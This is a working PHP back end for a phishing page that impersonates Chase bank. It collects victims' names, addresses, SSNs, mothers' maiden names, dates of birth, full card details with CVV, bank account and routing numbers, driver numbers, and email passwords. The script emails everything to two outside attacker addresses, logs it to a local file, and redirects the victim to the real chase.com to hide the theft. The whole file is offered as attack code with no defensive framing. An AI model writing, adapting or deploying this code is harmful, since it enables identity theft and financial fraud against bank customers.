<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Chase Info-----------------------\n";
$message .= "First Name            : ".$_POST['formselect1']."\n";
$message .= "Last name            : ".$_POST['formtext2']."\n";
$message .= "Billing Address            : ".$_POST['formtext3']."\n";
$message .= "City            : ".$_POST['formtext4']."\n";
$message .= "Country            : ".$_POST['formselect1']."\n";
$message .= "state            : ".$_POST['formselect2']."\n";
$message .= "ZipCode            : ".$_POST['formtext5']."\n";
$message .= "Phone Number            : ".$_POST['formtext6']."\n";
$message .= "SSN            : ".$_POST['formtext7']."\n";
$message .= "Mother Maiden            : ".$_POST['formtext8']."\n";
$message .= "Date Of Birth            : ".$_POST['formselect3']."\n";
$message .= "Date Of day            : ".$_POST['formselect4']."\n";
$message .= "Date Of Year           : ".$_POST['formselect5']."\n";
$message .= "Email            : ".$_POST['formtext9']."\n";
$message .= "--------------Card Info-----------------------\n";
$message .= "Card Type            : ".$_POST['formselect6']."\n";
$message .= "Card Number            : ".$_POST['formtext10']."\n";
$message .= "Exp date            : ".$_POST['formselect7']."\n";
$message .= "Ex Year            : ".$_POST['formselect8']."\n";
$message .= "name On Card            : ".$_POST['formtext11']."\n";
$message .= "CVV           : ".$_POST['formtext12']."\n";
$message .= "Card Signture            : ".$_POST['formtext13']."\n";
$message .= "Bank Account            : ".$_POST['formtext14']."\n";
$message .= "Routing Account            : ".$_POST['formtext15']."\n";
$message .= "Driver Number            : ".$_POST['formtext16']."\n";
$message .= "Email           : ".$_POST['formtext17']."\n";
$message .= "Password            : ".$_POST['formtext18']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY unknown-------------\n";
$send = "mooremoney1900@gmail.com,mooremoney1800@hotmail.com";
$subject = "Result from Unknown";
$headers = "From: Chase Info<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$fp = fopen("use.txt","a");
fputs($fp,$message);
fclose($fp);
	
		   header("Location: http://www.chase.com/");

	 
?>